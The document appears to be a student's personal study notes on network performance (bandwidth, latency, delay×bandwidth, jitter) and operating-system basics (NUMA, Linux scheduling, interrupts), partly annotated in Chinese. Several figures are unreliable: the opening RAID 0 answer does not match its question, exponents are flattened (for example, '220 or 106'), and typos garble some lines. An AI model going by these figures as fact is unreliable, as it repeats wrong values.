Access speed is most importance on a web server. You want to purchase some fast 3 TB hard drives and install them in a RAID 0 array. How many drives will you need to purchase to host 900 GB of data?
  - RAID 0 doesn’t perform any fault tolerance and doesn’t require any extra disk space. You can obtain 9 TB of data by using three disks. 528CN: 1.1 introduction
Operating system is software that manages a computer’s hardware 528CN: 1 Foundation
1.5 PERFORMANCE
the effectiveness of computations distributed over the network often depends directly on the
efficiency with which the network delivers the computation’s data.
While the old programming adage “first get it right and then make it fast” is valid in many
settings, in networking it is usually necessary to “design for performance.”
It is important to understand the various factors that impact network performance.
1.5.1 Bandwidth and Latency
Network performance is measured in two fundamental ways:
Bandwidth / throughput: a measure of the width of a frequency band
  - example:
  - a voice-grade telephone line supports a frequency band ranging from 300 to 3300 Hz = ( bandwidth of 3300 Hz − 300 Hz = 3000 Hz). If measured in hertz, then it probably refers to the range of signals that can be accommodated.
  - bandwidth necessary: 8 bits x 3x103 hz = 24 Kbps
  - The bandwidth of a network: the number of bits that can be transmitted over the
network in a certain period of time. data rate.
  - It is sometimes useful to think of bandwidth in terms of how long it takes to
transmit each bit of data.
  - 10-M bps network, 10 million bits/second, 10,000,000
  - 0.1 microsecond (μs), 1/1,000,000, to transmit each bit.
  - A useful distinction can also be made between the maximum data rate that is available on the link and the number of bits per second that we can actually transmit over the link in practice.
Sometimes you want to be more precise, focusing on the bandwidth of a single physical link or
of a logical process-to-process channel.
At the physical level, bandwidth is constantly improving, with no end in sight. Intuitively, if you think of a second of time as a distance you could measure with a ruler and bandwidth as how many bits fit in that distance, then you can think of each bit as a pulse of some width.
example, each bit on a 1-Mbps link is 1 μs wide, each bit on a 2-Mbps link is 0.5 μs wide.
 The more sophisticated the transmitting and receiving technology, the narrower each bit can become and, thus, the higher the bandwidth. For logical process-to-process channels, bandwidth is also influenced by other factors, including how many times the software that implements the channel has to handle, and possibly transform, each bit of data.
Latency / delay: the measured performance of a system, how long it takes a message to travel from one end of a network to the other.
  - example:
  - one-way latency: a latency of 24 milliseconds (ms): it takes a message 24
ms to travel from one host to the other.   - round-trip time (RTT) of the network: how long it takes to send a message from one end to the other and back. (more important)
We often think of latency as having 3 components.
1st, the speed-of-light propagation delay. This delay occurs because nothing, including a bit on a wire, can travel faster than the speed of light.
  - If you know the distance between two points, you can calculate the speed-of- light latency,
  - ight travels across different media at different speeds:
  - at 3.0 × 108 m/s in a vacuum, 2.3 × 108 m/s in a copper cable, and 2.0 × 108 m/s in
an optical fiber.
2nd, the amount of time it takes to transmit a unit of data.
  - This is a function of the network bandwidth and the size of the packet in which the data is carried.
3rd, there may be queuing delays inside the network, since packet switches generally need to store packets for some time before forwarding them on an outbound link.
we could define the total latency as
  - Latency = Propagation + Transmit + Queue
  - Propagation = Distance/SpeedOfLight
  - Transmit = Size/Bandwidth
  - Distance: the length of the wire over which the data will travel,
  - SpeedOfLight: the effective speed of light over that wire,
  - Size: size of the packet,
  - Bandwidth: the bandwidth at which the packet is transmitted.
  - Note: if the message only one bit and it is a single link (not whole network), then the Transmit and Queue terms are not relevant, latency = propagation delay only. Bandwidth and latency combine to define the performance characteristics of a given link or channel. But, their relative importance depends on the application.
For some applications, latency dominates bandwidth. Example:
  - a client sends a 1-byte message to a server and receives a 1-byte message in return is latency bound.
  - Assuming no serious computation is involved in preparing the response, the application will perform much differently on a transcontinental channel with a 100-ms RTT than it will on an across-the-room channel with a 1-ms RTT.
  - Whether the channel is 1 Mbps or 100 Mbps is relatively insignificant, however, since the time to transmit a byte (Transmit) is 8 μs and the latter implies Transmit = 0.08 μs.
the bandwidth of the channel dominates performance.
  - a 25-megabyte (MB) image, a 10 Mbps channel.
  - It will take 20 seconds to transmit the image.
  - Transmit = Size/Bandwidth = Package size byte x 8 bits / bandwidth
  - (25 × 106 × 8 bits ÷10 × 106 bps = 20 seconds)
  - making it relatively unimportant if the image is on the other side of a 1-ms channel or a 100-ms channel; the difference between a 20.001-second response time and a 20.1-second response time is negligible.
  Figure 1.17 gives you a sense of how latency or bandwidth can dominate performance in different circumstances.
The graph shows how long it takes to move objects of various sizes (1 byte, 2 KB, 1 MB) across networks with RTTs ranging from 1 to 100 ms and link speeds of either 1.5 or 10 Mbps.
Bigger package, less importante the RTT.
For a 1-byte object (say, a keystroke), latency remains almost exactly equal to the RTT, so that you cannot distinguish between a 1.5-Mbps network and a 10-Mbps network. For a 2-KB object (say, an email message), the link speed makes quite a difference on a 1-ms RTT network but a negligible difference on a 100-ms RTT network.
For a 1-MB object (say, a digital image), the RTT makes no difference—the link speed that dominates performance across the full range of RTT.
bandwidth requirements of an application: the number of bits per second that it needs to transmit over the network to perform acceptably.
  - For some applications, might be “whatever I can get”;
  - for others, it might be some fixed number (preferably no more than the available
link bandwidth);
  - and for others, it might be a number that varies with time.
latency and delay: how long it takes to perform a particular function, such as delivering a message or moving an object.
propagation delay: specific amount of time it takes a signal to propagate from one end of a link to another.
Also, we make it clear in the context of the discussion whether we are referring to the one-way latency or the round-trip time.
As an aside, computers are becoming so fast that when we connect them to networks, it is sometimes useful to think, at least figuratively, in terms of instructions per mile.
Consider what happens when a computer that is able to execute 1 billion instructions per second sends a message out on a channel with a 100-ms RTT. (To make the math easier, assume that the message covers a distance of 5000 miles.).
If that computer sits idle the full 100 ms waiting for a reply message, then it has forfeited the ability to execute 100 million instructions, or 20,000 instructions per mile. It had better have been worth going over the network to justify this waste. 1.5.2 Delay×Bandwidth Product
It is also useful to talk about the product of these two metrics, delay × bandwidth product.
 Intuitively, if we think of a channel between a pair of processes as a hollow pipe,
latency corresponds to the length of the pipe and the bandwidth gives the diameter of the pipe,
then the delay × bandwidth product = the volume of the pipe (the maximum number of bits that could be in transit through the pipe at any given instant).
Said another way, if latency (measured in time) corresponds to the length of the pipe, then given the width of each bit (measured in time) you can calculate how many bits fit in the pipe.
example, a transcontinental channel with a one-way 50 ms latency and 45 Mbps bandwidth which is able to hold approximately 280 KB data. In other words, this example channel (pipe) holds as many bytes as the memory of a personal computer from the early 1980s could hold.
Latency (delay) x bandwidth = the volume of the pipe
50×10−3 s × 45×106 bits/s = 2.25 × 106 bits
The delay × bandwidth product is important for high-performance networks because it
corresponds to how many bits the sender must transmit before the first bit arrives at the receiver. If the sender is expecting the receiver to somehow signal that bits are starting to arrive, and it
takes another channel latency for this signal to propagate back to the sender, then the sender can send up one RTT × bandwidth worth of data before hearing from the receiver that all is well. The bits in the pipe are said to be “in flight,” if the receiver tells the sender to stop transmitting it
might receive up to one RTT × bandwidth’s worth of data before the sender manages to respond. In our example above, that amount corresponds to 5.5 × 106 bits (671 KB) of data.
But, if the sender does not fill the pipe—send a whole RTT × bandwidth product’s worth of data before it stops to wait for a signal—the sender will not fully utilize the network.
Note: “delay” or “delay×bandwidth” is one-way latency or RTT is made clear by the context. Table 1.1 shows some examples of RTT × bandwidth products for some typical network links.
  How Big Is a Mega?
There are several pitfalls you need to be aware of when working with the common units of networking—MB, Mbps, KB, and kbps.
The first is to distinguish carefully between bits and bytes.   - lowercase b: bits, capital B: bytes.
The second is to be sure you are using the appropriate definition of mega (M) and kilo (K).
  - Mega, can mean either 220 or 106.
  - Kilo, can be either 210 or 103.
What is worse, in networking we typically use both definitions. Here’s why:
Network bandwidth, which is often specified in terms of Mbps, is typically governed by the
speed of the clock that paces the transmission of the bits.
A clock that is running at 10 MHz is used to transmit bits at 10 Mbps. Because the mega in MHz means 106 hertz, Mbps is usually also defined as 106 bits per second. (Similarly, kbps is 103 bits per second.)
On the other hand, when we talk about a message that we want to transmit, we often give its size in kilobytes. Because messages are stored in the computer’s memory, and memory is typically measured in powers of two, KB is usually taken to mean 210 . (MB usually means 220 .)
When you put the two together
  - it is not uncommon to say: 32-KB message over a 10-Mbps channel,
  - which should be: 32 × 210 × 8 bits are being transmitted at a rate of 10 × 106 bits per second. This is the interpretation we use throughout the book, unless explicitly stated otherwise.
The good news is that many times we are satisfied with a back-of-the-envelope calculation, in which case it is perfectly reasonable to make the approximation that 106 is really equal to 220 (making it easy to convert between the two definitions of mega). This approximation introduces only a 5% error. We can even make the approximation in some cases that a byte has 10 bits, a 20% error but good enough for order-of-magnitude estimates.
To help you in your quick-and-dirty calculations, 100 ms is a reasonable number to use for a cross-country round-trip time—at least when the country in question is the United States—and 1 ms is a good approximation of an RTT across a local area network.
In the case of the former, we increase the 48-ms round-trip time implied by the speed of light over a fiber to 100 ms because there are other sources of delay, such as the processing time in the switches inside the network. You can also be sure that the path taken by the fiber between two points will not be a straight line.
1.5.3 High-Speed Networks
The bandwidths available on today’s networks are increasing at a dramatic rate, and there is eternal optimism that network bandwidth will continue to improve. This causes network designers to start thinking about what happens in the limit or, stated another way, what is the impact on network design of having infinite bandwidth available.
High-speed networks bring a dramatic change in the bandwidth available to applications, what does not change as bandwidth increases: the speed of light. To quote Scotty from Star Trek, “Ye cannae change the laws of physics.”4 In other words, “high speed” does not mean that latency improves at the same rate as bandwidth; the transcontinental RTT of a 1-Gbps link is the same 100 ms as it is for a 1-Mbps link.
To appreciate the significance of ever-increasing bandwidth in the face of fixed latency, consider what is required to transmit a 1-MB file over a 1-Mbps network vs over a 1-Gbps network, both of which have an RTT of 100 ms.
Transmit time = Size/Bandwidth = 1 x106 x 8 bits / 1 x106 bps = 8 seconds Latency (delay) x bandwidth = the volume of the pipe
  - 1-Mbps network = 100 x10−3 x 1 x106 bps = 100 x103bits.
  - 1-Gbps network = 100 x10−3 x 1 x109 bps = 100 x106bits.
In the case of the 1-Mbps network, it takes 80 round-trip times to transmit the file; during each RTT, 1.25% of the file is sent. In contrast, the same 1-MB file doesn’t even come close to filling 1 RTT’s worth of the 1-Gbps link, which has a delay × bandwidth product of 12.5 MB.
Figure 1.19 illustrates the difference between the two networks. 1-MB file. 1-MB file = 1 x106 x 8 bits = 8 x 106 bits.
1-Mbps network: the 1-MB file like a stream of data that needs to be transmitted.
  - 1-Mbps network volume: 100 x103bits, 1-MB file size: 8 x 106 bits
  - 8 x 106 bits / 100 x103bits = 80 (times) pipes full 1-Gbps network: the 1-MB file like a single packet on 1-Gbps network.
  - 1-Gbps network volume: 100 x106bits, 1-MB file size: 8 x 106 bits
  - 8 x 106 bits / 100 x106bits = 8/100 (times) pipes  Another way to think about the situation is that more data can be transmitted during each RTT on a high-speed network, so much so that a single RTT becomes a significant amount of time. Thus, while you wouldn’t think twice about the difference between a file transfer taking 101 RTTs rather than 100 RTTs (a relative difference of only 1%), suddenly the difference between 1 RTT and 2 RTTs is significant—a 100% increase. In other words, latency, rather than throughput, starts to dominate our thinking about network design.
The relationship between throughput and latency. Throughput = TransferSize / TransferTime
= TransferSize / (RTT + TransferSize/Bandwidth)
TransferTime: the elements of one-way Latency, and any additional time spent requesting or
setting up the transfer.
TransferTime = RTT + TransferSize/Bandwidth (Transmit time) RTT: a request message being sent across the network and the data being sent back. Example: a 1-MB file across a 1-Gbps network with a RTT of 100 ms.
  - Throughput = TransferSize / TransferTime
  - = 1x106x8 bits / (100 ms + 1x106x8 bits/ 1x109 bps)
  - = 1x106x8 bits / (100 x10-3 s + 8 x10-3 s)
  - = 1x106x8 bits / 108 x10-3 s
  - = 8x106 bits / 108 x10-3 s
  - = 8000x106 bits / 108 s
  - = 74.1x106 bps = 74.1 Mbps = the effective throughput (not 1 Gbps)
Clearly, transferring a larger amount of data will help improve the effective throughput, where in the limit an infinitely large transfer size will cause the effective throughput to approach the network bandwidth.
On the other hand, having to endure more than 1 RTT—example, to retransmit missing packets—will hurt the effective throughput for any transfer of finite size and will be more noticeable for small transfers.
1.5.4 Application Performance Needs
More bandwidth that is available, the faster the program will be able to return the image to the
user.
However, some applications are able to state an upper limit on how much bandwidth they need. Video applications are a prime example:
stream a video that is one quarter the size of a standard TV screen; it has a resolution of 352 by 240 pixels. If each pixel is represented by 24 bits of information, as would be the case for 24-bit color, the size of each frame: (352 × 240 × 24)/8 = 247.5 KB
If the application needs to support a frame rate of 30 frames per second, then it might request a throughput rate: size/time = 247.5 x103 x 30 bps = 75 Mbps.
no interest to provide more bandwidth to this application because it has only so much data to transmit in a given period of time.
Unfortunately, the situation is not as simple as this example suggests. Because the difference between any two adjacent frames in a video stream is often small, it is possible to compress the video by transmitting only the differences between adjacent frames. Each frame can also be compressed because not all the detail in a picture is readily perceived by a human eye. The compressed video does not flow at a constant rate, but varies with time according to factors such as the amount of action and detail in the picture and the compression algorithm being used. Therefore, it is possible to say what the average bandwidth requirement will be, but the instantaneous rate may be more or less.
The key issue is the time interval over which the average is computed. Suppose that this example video application can be compressed down to the point that it needs only 2 Mbps, on average. If it transmits 1 megabit in a 1-second interval and 3 megabits in the following 1-second interval, then over the 2-second interval it is transmitting at an average rate of 2 Mbps; however, this will be of little consolation to a channel that was engineered to support no more than 2 megabits in any one second. Clearly, just knowing the average bandwidth needs of an application will not always suffice.
Generally, however, it is possible to put an upper bound on how large a burst an application like this is likely to transmit. A burst might be described by some peak rate that is maintained for some period of time. Alternatively, it could be described as the number of bytes that can be sent at the peak rate before reverting to the average rate or some lower rate. If this peak rate is higher than the available channel capacity, then the excess data will have to be buffered somewhere, to be transmitted later. Knowing how big of a burst might be sent allows the network designer to allocate sufficient buffer capacity to hold the burst. We will return to the subject of describing bursty traffic accurately in Chapter 6.
Analogous to the way an application’s bandwidth needs can be something other than “all it can get,” an application’s delay requirements may be more complex than simply “as little delay as possible.” In the case of delay, it sometimes doesn’t matter so much whether the one-way latency of the network is 100 ms or 500 ms as how much the latency varies from packet to packet. The variation in latency is called jitter.  Consider: the source sends a packet once every 33 ms, as would be the case for a video application transmitting frames 30 times a second. If the packets arrive at the destination spaced out exactly 33 ms apart, then we can deduce that the delay experienced by each packet in the network was exactly the same. If the spacing between when packets arrive at the destination— sometimes called the interpacket gap—is variable, however, then the delay experienced by the sequence of packets must have also been variable, and the network is said to have introduced jitter into the packet stream, as shown in Figure 1.20. Such variation is generally not introduced in a single physical link, but it can happen when packets experience different queuing delays in a multihop packet-switched network. This queuing delay corresponds to the Queue component of latency defined earlier in this section, which varies with time.
To understand the relevance of jitter, suppose that the packets being transmitted over the network contain video frames, and in order to display these frames on the screen the receiver needs to receive a new one every 33 ms. If a frame arrives early, then it can simply be saved by the receiver until it is time to display it. Unfortunately, if a frame arrives late, then the receiver will not have the frame it needs in time to update the screen, and the video quality will suffer; it will not be smooth. Note that it is not necessary to eliminate jitter, only to know how bad it is. The reason for this is that if the receiver knows the upper and lower bounds on the latency that a packet can experience, it can delay the time at which it starts playing back the video (i.e., displays the first frame) long enough to ensure that in the future it will always have a frame to dis- play when it needs it. The receiver delays the frame, effectively smoothing out the jitter, by storing it in a buffer. We return to the topic of jitter in Chapter 9.
Some terms you should know before solving this question
Memory bandwidth is the rate at which data can be read from or
 stored into a semiconductor memory by a processor.
I/O buses connect the CPU to all other components, except RAM. Data are moved on the buses from one component to another, and data from other components to the CPU and RAM. The I/O buses differ from the system bus in speed.
A bottleneck, in a communications context, is a point in the enterprise where the flow of data is impaired or stopped entirely. Effectively, there isn't enough data handling capacity to handle the current volume of traffic.
Since I/O bus speed is less than Memory bandwidth,it is bottleneck. Effective bandwidth that the I/O bus can provide is 1000/2
=500Mbps because each packet crosses the I/O bus twice. Therefore, the number of interfaces is ⌊500/100⌋ = 5
  Chapter 1: introduction
Operatnig System
is software that manages a computer’s hardware.
provides a basis for application programs
acts as an intermediary between the computer user and the computer
hardware.
OS goals:
Excute user programs and make solving user problems esaier Make the computer system conveninnt to use Ise the conputer garwae in an eddivient manner.
536OS: chapter 1.1 What Operating Systems Do
A computer system can be divided roughly into 4 components:
1. the hardware (provides the basic computing resources for the system.)
  - the central processing unit (CPU), the memory, and the input/output (I/O) devices
2. the operating system
  - controls the hardware and coordinates its use among the various
application programs for the various users.
  - consisting of hardware, software, and data. provides the proper use of these resources in the operation of the computer system.
  - simply provides an environment within which programs can do useful work.
3. the application programs (define the ways in which these resources are used to solve users’ computing problems)
  - such as word processors, spreadsheets, compilers, and web browsers 4. a user
  - people, machinew, computers. 536OS: chapter 1.1.1 User View
The user’s view of the computer varies according to the interface being used, system is designed for user to monopolize 专营 its resources.
operating system designed mostly for ease of use: performance and security (maximize the work/play that the user is performing) > resource utilization (how various hardware and software resources are shared)
Increasingly, more users interact with devices.
These devices are typically connected to networks through cellular or other wireless technologies.
The user interface: touch screen, physical keyboard and mouse, through voice recognition interface (like Siri)
shared computer: like mainframe or minicomputer, must keep all users happy dedicate systems: like workstations, have dedicated resources but frequently
use shared resources from servers
Handheld computers: resource poor, optimized for usability and battery life
Computers have little/no user view: like embedded 植入的 computers in home devices and automobiles may have numeric keypads and may turn indicator lights on or off to show status,
  - But their OS and app are designed primarily to run without user intervention.
536OS: chapter 1.1.2 System View
From the computer’s point of view:
the operating system is the program most intimately involved with the hardware, OS
like a resource allocator.
  - Computer system has many resources required to solve a problem: CPU
time, memory space, storage space, I/O devices...   - Manages all resources.
  - Facing conflicting requests for resources, decide how to allocate them to specific programs and users, operate the computer system efficiently and fairly.
An operating system is a control program.
  - manages the execution of user programs to prevent errors and improper
use of the computer.
  - It is especially concerned with the operation and control of I/O devices.
536OS: chapter 1.1.3 Defining Operating Systems
the term operating system covers many roles and functions.
Computing started as an experiment to determine what could be done, quickly moved to fixed-purpose systems for military uses, such as code breaking and trajectory plotting, and governmental uses, such as census calculation.
Those early computers evolved into general-purpose, multifunction mainframes, and that’s when operating systems were born.
In the 1960s, Moore’s Law predicted that the number of transistors on an integrated circuit would double every 18 months, and that prediction has held true. Computers gained in functionality and shrank in size, leading to a vast number of uses and a vast number and variety of operating systems.
we have no completely adequate definition of an operating system.
Operating systems exist because they offer a reasonable way to solve the problem of creating a usable computing system.
The fundamental goal of computer systems: execute programs and to make solving user problems easier.
The common functions of controlling and allocating resources are then brought together into one piece of software: the operating system.
We have no universally accepted definition of operating system.
the operating system is the one program running at all times on the computer— kernel.
Along with the kernel, there are two other types of programs:
  - system programs: associated with the OS but are not necessarily part of the kernel.
  - application programs: include all programs not associated with the operation of the system.
The matter of what constitutes an operating system became increasingly important as personal computers became more widespread and operating systems grew increasingly sophisticated.
In 1998, the United States Department of Justice filed suit against Microsoft:
Microsoft included too much functionality in its operating systems and thus prevented application vendors from competing. (example, a web browser was an integral part of Microsoft’s operating systems.) As a result, Microsoft was found guilty of using its OS monopoly to limit competition.
Mobile operating systems, the number of features constituting the operating system is increasing.
Mobile OS often include a core kernel and middleware—a set of software frameworks that provide additional services to application developers.
Example: Apple’s iOS and Google’s Android,
features core kernel along with middleware that supports databases, multimedia, and graphics (to name only a few).
In summary, the operating system includes:
the always- running kernel,
middleware frameworks (ease application development and provide features), system programs (managing the system while it is running). Computer-System Organization
- Bootstrap program is loaded at power-up or reboot.
  - Typically stored in ROM or EPROM, known as firmware
  - Initializes all aspects of system.
  - Loads OS kernel and starts execution
  A modern computer system consists of one or more CPUs and a number of device controllers (like disk/audio/graphics display device) connected through a common bus (provides access between components and shared memory)
- Depending on the controller, more than one device may be attached.
- Each device controllers maintains a local buffer storage and a set of special-
purpose registers.
- device controllers responsible for moving the data between the peripheral devices 外围设备 it controls and its local buffer storage.
- CPU moves data between the main memory and local buffers.
Typically, OS have a device driver for each device controller.
- This device driver understands the device controller and provides the rest of the
OS with a uniform interface to the device.
- The CPU and the device controllers can execute in parallel, competing for memory cycles.
- I/O deiceas and the CPU can execute concurrently. To ensure orderly access to the shared memory, a memory controller synchronizes access to the memory.
Device controller informs CPU that it has finished its operation by causing an interrupt
CPU Concepts, Scheduling
central processing unit, CPUs have one job: execute tasks. They're given work to do, they execute the work.
- How they execute tasks and share memory, primary concern to monitor systems.
CPUs are immensely complicated mechanisms
CPU memory topology
two primary architectures, SMP and NUMA. - SMP, symmetric multi-processor.
  - processes allocate memory from a single memory space
  - have consistent performance across all memory
  - since it's coming from the same physical memory space.
  - But this model of processing and memory management has scalability limitations
  - notably contention for access on a system bus when accessing this memory.
- NUMA, non-uniform memory access.
  - current most common model
  - servers went from maxing 128 gigabytes of memory now all up to multi-terabyte configurations because of NUMA
  - Sections of physical memory are controlled by one or many processors, NUMA nodes
  - systems can have several NUMA nodes and thus larger areas of memory,
  - each NUMA node managing its slice of physical memory.
  - the OS see all the CPUs and memory in each NUMA node.
  - two CPUs in your system configured in two separate
NUMA nodes,
  - each NUMA node has 256 gigabytes of memory,
  - the OS will see both CPUs in a total memory of 512
 gigabytes.
  - the OS needs to be aware of how resources are allocated from
each NUMA node
  - local memory access: CPUs accessing memory within
their NUMA node, very high speed.
  - non-local/foreign memory access: CPUs accessing
memory from another NUMA node
  - comparably very slow.
  - traverse the system bus from one NUMA node to the other for access to that memory.
  - the foreign memory address is physically further away from the processor than the local memory inside that NUMA node.
  - reduces bus contention, memory is broken up into these nodes and processors and processes will favor memory from within its local NUMA node.
  - can inhibit application performance.
- Most modern operating system are NUMA aware
  - resources are going to be allocated from the same nodes if conditions permit
  - processes being scheduled onto the CPUs
  - and memory being allocated from that NUMA node.
- processors do work. compute the stuff for us. 738

- how do they get that work that they need to perform? scheduler
  - schedules tasks, threads 细线, 线索, 思路
  - Unit of scheduling
  - a thread is Linux's abstraction for a unit of work, something
that needs to get done.
  - The scheduler's going to take that unit of work and place it
into a queue for access to the CPU
- many CPUs, each CPU will have its own queue
The scheduler on a Linux system is smart and complicated
- The processor queues: how things get scheduled onto the CPU.
- aren't populated on a first-come, first-serve basis.
- Linux includes several different scheduling policies built in
  - the default scheduler being sched_other, sched_normal.
  - a time sharing scheduling policy
  - Preemptive 先发制人的:
  - a thread will get access to the CPU for a fixed amount of time, do some of its work
  - when its time runs out, the thread will go back to the scheduler to be scheduled again and get back into one of the queues thread for every thread trying to access the CPU.
  - prevents a single thread from hogging the CPU entirely, burning up the CPU without yielding control.
  - thread through this time share scheduling will be able to complete its work and go ahead and exit.
  - Dynamic priority list: thread can also pause processing due to the need to for an external resource.
  - If executing and need to go read or write something from disk or data from other thread or the network,
  - the thread is going to stop, go to a waiting state
  - once a thread receives whatever data it was waiting for, it will go back to the scheduler and get in line into a queue again.
  - Based on niceness: on a Linux system, not just one queue per processor. but several queues ordered by priority.
  - higher priority threads, niceness, will get into a higher priority queue
  - higher priority queues are looked at first when a CPU is ready to take work.
  - If there's something there, it gets access to the CPU before the lower priority queues.
  - Now, this isn't 100% of the time.
  - The scheduler is smart enough to not starve the lower priority queues if there's always something in a higher priority queue.   - Also Linux schedulers for the most part are NUMA aware.
  - put threads back onto the NUMA nodes previously scheduled on because their memory is already going to be allocated local to that node.
  - Now, there are times when a thread will need to be scheduled onto another node due to resource contention or some other constraint.
- process state:
- running state: Threads that are on the CPU executing
- Runnable: threads that are in a queue, that are ready to go onto the CPU
- Sleeping: thread is waiting for an external resource
in CPUs, what to monitor
- First, CPU percentages.
  - a very valuable performance metric.
  - It measures your system's total work and it's remaining
capacity
  - keep it low if at all possible.
  - baselining is important. What's normal? not normal?
  - Maybe 60% is normal. if users are okay, then we're likely okay   - to ensure is that there aren't any huge variances 差异 or sustained spikes in utilization, but again baseline, know your workload.
  - systems slow down significantly when your CPU utilization exceeds 80% and on top of that you don't have much more headroom above 80% if there is a change or a spike in your workload.
- the length of those scheduling queues. run queues. load average
  - If processes are in the run queue for a CPU and they're
runnable,
  - process is waiting for access to the CPU
  - the application is waiting and likely an end user is waiting.
- short spikes in CPU utilization aren't bad.
  - shoots up for a few seconds/minutes and comes back down,
that's okay. It literally means that CPU is just being used.
  - But if we see it shoot up for a sustained period of time and it stays there, this could be indicative of an application problem or something that we certainly need to look more closely at.
  - Perhaps users are running batch jobs in the middle of the day rather than at night, impacting production user workload.
  - Baseline, know what's normal - monitor for long waits.
  - or disk I/O, network I/O, other external resources?
  - If we are, this could tell us that we need to look at another part of our system for a performance issue. It might not be a CPU issue.
Interrupt vector
Consider a typical computer operation: a program performing I/O.
To start an I/O operation, the device driver loads the appropriate registers in the device controller.
The device controller examines the contents of registers to determine what action to take (like “read a character from the keyboard”).
The device controller starts the transfer of data from the device to its local buffer. Once the transfer of data is complete, the device controller informs the device
driver, by causing an interrupt, that it has finished its operation.
The device driver then gives control to other parts of the operating system, possibly returning the data or a pointer to the data if the operation was a read, or returns status information such as “write completed successfully” or “device busy”.
^ Chapter 1.2.1.1 Overview program counter. cpu与磁盘、网卡、键盘等外围设备I/O交互时，cpu下发I/O请求到这 些设备后，相对cpu的处理能力而言，磁盘、网卡等设备需要较⻓时间完成请求处理。 在请求发出到处理完成这段时间，应如何设定cpu的行为，既能让这期间运行的其他程 序得到执行，又能在外设处理完成后，cpu及时获取到处理完成的消息? 可以按以下方式设定 cpu 行为:Determines which type of interrupt has occurred:
Polling 轮询:每隔一段时间询问请求是否处理完成:   - 轮询会带来不必要的cpu消耗。
vectored interrupt system 中断:cpu下发请求后执行其他进程，磁盘等外设完成处 理后，主动告知cpu
  - I/O通过电信号告知cpu。
Separate segments of code determine what action should be taken for each type of
interrupt.
不同设备发起的中断以不同的数值标识，这些标识中断的数值被称为中断请求线
(interrupt request line, IRQ line)
CPU接收到中断后会将中断递交给内核处理，内核中有相应函数完成中断处理 (interrupt handler or interrupt service routine,ISR)。
Hardware may trigger an interrupt any time by sending a signal to the CPU, usually by way of the system bus. (There may be many buses within a computer system, but the system bus is the main communications path between the major components.)
Interrupts: used for many purposes, key part of how OS and hardware interact, important part of computer architecture.
When the CPU is interrupted 打断, it stops what it is doing and immediately transfers execution to a fixed location.
The fixed location usually contains the starting address where the service routine for the interrupt is located.
The interrupt service routine executes; on completion, the CPU resumes the interrupted computation. A timeline of this operation is shown in Figure 1.3. To run the animation assicated with this figure please click here.
Figure 1.3 Interrupt timeline for a single program doing output.  Each computer design has its own interrupt mechanism, but several functions are common.
The interrupt must transfer control to the appropriate interrupt service routine. The straightforward method to manag the transfer is invoke interrupt-specific
handler (generic routine) to examine the interrupt information.
However, interrupts must be handled quickly, as they occur very frequently. A table of pointers to interrupt routines can be used instead to provide the necessary speed.
The interrupt routine is called indirectly through the table, with no intermediate routine needed.
Generally, the table of pointers is stored in low memory (the first hundred or so locations). These locations hold the addresses of the interrupt service routines for the various devices. This array, or interrupt vector, of addresses is then indexed by a unique number, given with the interrupt request, to provide the address of the interrupt service routine for the interrupting device.
Operating systems as different as Windows and UNIX dispatch interrupts in this manner.
The interrupt architecture must also save the state information of whatever was interrupted, then it can restore this information after servicing the interrupt.
If the interrupt routine needs to modify the processor state—example, by modifying register values — it must explicitly save the current state and then restore that state before returning.
After the interrupt is serviced, the saved return address is loaded into the program counter, and the interrupted computation resumes as though the interrupt had not occurred.
^ Chapter 1.2.1.2 Implementation
The basic interrupt mechanism works as follows.
The CPU hardware has a wire, interrupt-request line, that the CPU senses after executing every instruction.
When the CPU detects that a device controller has asserted a signal on the interrupt-request line
  - CPU reads the interrupt number and jumps to the interrupt-handler routine by using that interrupt number as an index into the interrupt vector.
  - CPU then starts execution at the address associated with that index. The interrupt-handler routine:
  - saves any state it will be changing during its operation,
  - determines the cause of the interrupt,
  - performs the necessary processing,
  - performs a state restore,
  - executes a return from interrupt instruction to return the CPU to the execution state prior to the interrupt.
The device controller raises an interrupt by asserting a signal on the interrupt request line,
the CPU catches the interrupt and dispatches it to the interrupt handler,
The device controller clears the interrupt by servicing the device. Figure 1.4 summarizes the interrupt-driven I/O cycle.  The basic interrupt mechanism just described enables the CPU to respond to an asynchronous event, as when a device controller becomes ready for service. In a modern OS, we need more sophisticated interrupt-handling features.
1. We need the ability to defer interrupt handling during critical processing.
2. We need an efficient way to dispatch to the proper interrupt handler for a device.
3. We need multilevel interrupts, so that the OS can distinguish between high-and low-priority interrupts and can respond with the appropriate degree of urgency.
In modern computer hardware, these 3 features are provided by the CPU and the interrupt-controller hardware.
Most CPUs have 2 interrupt request lines. 从是否可屏蔽的⻆度
nonmaskable interrupt: reserved for events like unrecoverable memory errors. 无法
通过设置标志位屏蔽的中断，如电源掉电、时钟中断
maskable interrupt: it can be turned off by the CPU before the execution of critical instruction sequences that must not be interrupted. The maskable interrupt is used by device controllers to request service. 可通过设定中断屏蔽寄存器 EFLAGS中IF标志位关闭的中断 对于可屏蔽中断，关闭中断的方式有以下3种:
  - 使用 cli(clear interrupt) 指令，在全局范围关闭所有中断，使用 sti(set interrupt) 指令恢复
  - 调用 local_irq_disable 或 local_irq_save 关闭当前 cpu 中断，使用 local_irq_enable 或 local_irq_restore 恢复
  - 调用 disable_irq 或 disable_irq_nosync 在全局范围关闭某一特定中断线， 使用 enable_irq 或 synchronize_irq 恢复
  - 因中断是异步的，屏蔽中断可用于防止中断嵌套。
  - 非正常的中断关闭会带来很多不良结果，例如 cpu 不响应键盘中断时，用 户无法使用键盘操作;又例如 cpu 不响应时钟中断，则不能进行进程调 度，依赖于时钟中断的任务都无法完成，机器基本变成僵尸。
Recall that the purpose of a vectored interrupt mechanism is to reduce the need for a single interrupt handler to search all possible sources of interrupts to determine which one needs service.
In practice, however, computers have more devices (and, hence, interrupt handlers) than they have address elements in the interrupt vector.
A common way to solve this problem is to use interrupt chaining 链接, in which each element in the interrupt vector points to the head of a list of interrupt
handlers. When an interrupt is raised, the handlers on the corresponding list are called one by one, until one is found that can service the request.
This structure is a compromise between the overhead of a huge interrupt table and the inefficiency of dispatching to a single interrupt handler.
Figure 1.5 illustrates the design of the interrupt vector for Intel processors. The events 0 to 31, which are nonmaskable, are used to signal various error
conditions.
The events 32 to 255, which are maskable, are used for purposes such as device- generated interrupts.  The interrupt mechanism also implements a system of interrupt priority levels. enable the CPU to defer the handling of low-priority interrupts without masking all
interrupts
possible for high-priority interrupt to preempt 先占 the execution of a low-priority interrupt.
